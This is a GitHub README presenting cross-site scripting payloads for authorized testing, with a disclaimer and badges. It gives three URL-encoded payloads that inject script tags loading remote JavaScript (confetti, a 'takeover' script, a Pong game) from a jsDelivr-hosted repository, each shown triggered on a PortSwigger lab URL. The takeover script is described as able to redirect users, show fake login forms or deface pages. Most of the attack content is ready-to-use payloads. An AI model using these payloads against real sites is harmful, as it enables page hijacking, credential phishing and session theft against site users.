# XSS Payloads for Educational Purposes

<p align="center">

  <!-- Status / Purpose -->
  <img src="https://img.shields.io/badge/Status-Educational-blueviolet?style=for-the-badge&logo=github" alt="Educational" />
  <img src="https://img.shields.io/badge/Use-Authorized_Testing_Only-red?style=for-the-badge&logo=handshake" alt="Authorized Testing Only" />
  <img src="https://img.shields.io/badge/Focus-XSS%20Payloads-orange?style=for-the-badge&logo=javascript" alt="XSS Payloads" />

  <!-- Ethical / Legal -->
  <img src="https://img.shields.io/badge/Responsible_Disclosure-Required-critical?style=for-the-badge&logo=checkmarx" alt="Responsible Disclosure Required" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge&logo=open-source-initiative" alt="MIT License" />

  <!-- Technologies -->
  <img src="https://img.shields.io/badge/Language-JavaScript-yellow?style=for-the-badge&logo=javascript" alt="JavaScript" />
  <img src="https://img.shields.io/badge/Hosted_on-jsDelivr-lightgrey?style=for-the-badge&logo=cdn" alt="jsDelivr" />

  <!-- Community / Reference -->
  <a href="https://portswigger.net/web-security/cross-site-scripting">
    <img src="https://img.shields.io/badge/Lab-OWASP/PortSwigger-blue?style=for-the-badge&logo=bugcrowd" alt="PortSwigger Labs" />
  </a>
  <a href="https://owasp.org/www-community/xss/">
    <img src="https://img.shields.io/badge/Reference-OWASP_XSS-orange?style=for-the-badge&logo=owasp" alt="OWASP XSS" />
  </a>

</p>


###  Cross Site Scripting ( XSS ) Vulnerability  

### Overview : XSS is a web security flaw that allows an attacker to inject and execute malicious scripts in a victim’s browser by exploiting insufficient input/output encoding or sanitization; it can lead to account takeover, session theft, UI redress, or delivery of phishing/malware.

---

## IMPORTANT: SECURITY & ETHICAL USE DISCLAIMER

This repository contains XSS (Cross-Site Scripting) payloads for educational and ethical security testing purposes only.

### Authorized Use Cases:
- Security research and education
- Penetration testing on systems you own or have explicit written permission to test
- Developing and testing defensive security measures

### Strictly Prohibited:
- Any unauthorized testing on websites or systems you do not own
- Any malicious or illegal activities
- Use in a manner that violates any laws

**By using this repository, you agree to use this information responsibly. The maintainer is not responsible for any misuse or damage.**

---

### Remote XSS Payload Examples

These payloads demonstrate how attackers can load external JavaScript files from remote servers to execute malicious code.

### How Remote XSS Payloads Work:
- The payload uses `<script>` tags with `src` attributes pointing to external JavaScript files
- When the vulnerable page renders, the browser fetches and executes the remote script
- The scripts are hosted on CDN services like jsDelivr, making them accessible from anywhere
  
- This technique allows attackers to:
  
  - Bypass length restrictions (small payload loads large script)
  - Update malicious code without changing the initial payload
  - Load complex libraries and frameworks for advanced attacks

## Payload Examples

### Payload 1
```
%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/confetti_nl.js%3E%3C/script%3E
```
Payload triggered on portswigger test XSS site:
```
https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/confetti_nl.js%3E%3C/script%3E&context=html
```
- **Action:** This payload loads a remote JavaScript file that creates visual effects (confetti)
- **Impact:** Demonstrates how XSS can modify page content and user experience
- **Host:** Uses jsDelivr CDN to serve the script directly from this GitHub repository
- **Purpose:** Shows non-destructive payloads used for proof-of-concept testing


### Payload 2
```
%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/takeover.js%3E%3C/script%3E
```

Payload triggered on portswigger test XSS site:
```
https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/takeover.js%3E%3C/script%3E&context=html
```
- **Behavior:** Loads a script that demonstrates complete page takeover capabilities
- **Examples:** Could include functionality like redirecting users, displaying fake login forms, or defacing content
- **Impact:** Shows the severe impact of XSS vulnerabilities when combined with remote script loading
- **Note:** The actual malicious logic resides on the remote server, not in the initial payload


### Payload 3
```
%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/pong.js%3E%3C/script%3E
```

Payload triggered on portswigger test XSS site:
```
https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Cscript%20src=//cdn.jsdelivr.net/gh/asifnawazminhas/xss-payloads@main/pong.js%3E%3C/script%3E&context=html
```
- **Action:** Loads an interactive Pong game script onto the vulnerable page
- **Demonstrates:** How XSS can inject complex, interactive content
- **Observation:** Shows that even "benign" payloads use the same vulnerability chain as malicious ones
- **Takeaway:** Highlights the importance of proper input validation regardless of payload intent




